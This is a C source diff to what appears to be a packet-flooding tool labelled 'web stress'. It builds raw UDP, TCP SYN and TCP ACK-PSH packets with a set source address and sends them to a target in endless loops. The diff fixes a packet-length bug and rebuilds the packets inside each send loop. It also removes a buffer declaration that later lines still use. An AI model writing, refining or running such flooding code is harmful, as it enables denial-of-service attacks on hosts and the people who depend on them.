@@ -67,7 +67,7 @@ inline static void __packing( const uint32 __type,
 
          __udp->source            = source->sin_port;
          __udp->dest              = target->sin_port;
-         __udp->len               = htons( - SIZE_IP);
+         __udp->len               = htons(size - SIZE_IP);
          __udp->check             = 0x00;
 
          memset(&udpaux, 0, sizeof(struct __auxhdr2));
@@ -211,7 +211,6 @@ inline static void __udp_stress() {
 #endif
 
    register uint32 sock;
-   struct sockaddr_in source;
 
    pthread_mutex_lock(&__mutex);
    /* RAW socket*/
@@ -223,8 +222,7 @@ inline static void __udp_stress() {
    uchar cbuffer[pkt->buffsize + 40];
    memset(cbuffer, 0, sizeof(cbuffer));
 
-   __lookup(&source, pkt->src, 0, true);
-   __packing(WEB_UDP, cbuffer, (uint32) sizeof(cbuffer), &source, _data.target);
+   __packing(WEB_UDP, cbuffer, (uint32) sizeof(cbuffer), _data.source, _data.target);
 
    show("[WEB STRESS] Sending UDP packets to host [%s] on port %d...\n", 
    pkt->dst, pkt->port);
@@ -236,6 +234,7 @@ inline static void __udp_stress() {
 
    __SEND:
    sendto(sock, buffer, size, 0, (struct sockaddr *) targ, tsize);
+   __packing(WEB_UDP, cbuffer, (uint32) sizeof(cbuffer), _data.source, _data.target);
    goto __SEND;
 }
 
@@ -400,7 +399,6 @@ inline static void __syn_stress() {
 #endif
 
    register uint32 sock;
-   struct sockaddr_in source;
 
    pthread_mutex_lock(&__mutex);
    /* RAW socket*/
@@ -412,8 +410,7 @@ inline static void __syn_stress() {
    uchar cbuffer[pkt->buffsize + 52];
    memset(cbuffer, 0, sizeof(cbuffer));
 
-   __lookup(&source, pkt->src, 0, true);
-   __packing(WEB_TCP, cbuffer, (uint16) sizeof(cbuffer), &source, _data.target);
+   __packing(WEB_TCP, cbuffer, (uint16) sizeof(cbuffer), _data.source, _data.target);
 
    show("[WEB STRESS] Sending TCP SYN packets to host [%s] on port %d...\n", 
    pkt->dst, pkt->port);
@@ -425,6 +422,7 @@ inline static void __syn_stress() {
 
    __LOAD:
    sendto(sock, buffer, size, 0, (struct sockaddr *) targ, tsize);
+   __packing(WEB_TCP, cbuffer, (uint16) sizeof(cbuffer), _data.source, _data.target);
    goto __LOAD;
 }
 
@@ -436,7 +434,6 @@ inline static void __ack_stress() {
 #endif
 
    register uint32 sock;
-   struct sockaddr_in source;
 
    pthread_mutex_lock(&__mutex);
    /* RAW socket*/
@@ -448,8 +445,7 @@ inline static void __ack_stress() {
    uchar cbuffer[pkt->buffsize + 52];
    memset(cbuffer, 0, sizeof(cbuffer));
 
-   __lookup(&source, pkt->src, 0, true);
-   __packing(WEB_TCP, cbuffer, (uint16) sizeof(cbuffer), &source, _data.target);
+   __packing(WEB_TCP, cbuffer, (uint16) sizeof(cbuffer), _data.source, _data.target);
 
    show("[WEB STRESS] Sending TCP ACK-PSH packets to host [%s] on port %d..\n",
    pkt->dst, pkt->port);
@@ -461,6 +457,7 @@ inline static void __ack_stress() {
 
    __LOADING:
    sendto(sock, buffer, size, 0, (struct sockaddr *) targ, tsize);
+   __packing(WEB_TCP, cbuffer, (uint16) sizeof(cbuffer), _data.source, _data.target);
    goto __LOADING;
 }
 
@@ -469,8 +466,6 @@ bool web( const char **pull __unused__ ) {
 
    signal(SIGINT, __sigcatch);
    signal(SIGALRM, __sigcatch);
-
-   static char addressbuff[sizeof(struct sockaddr_in) * 2] __nocommon__;
 
    _data.source = (struct sockaddr_in *) addressbuff;
    _data.target = (struct sockaddr_in *) addressbuff + sizeof(struct sockaddr_in);
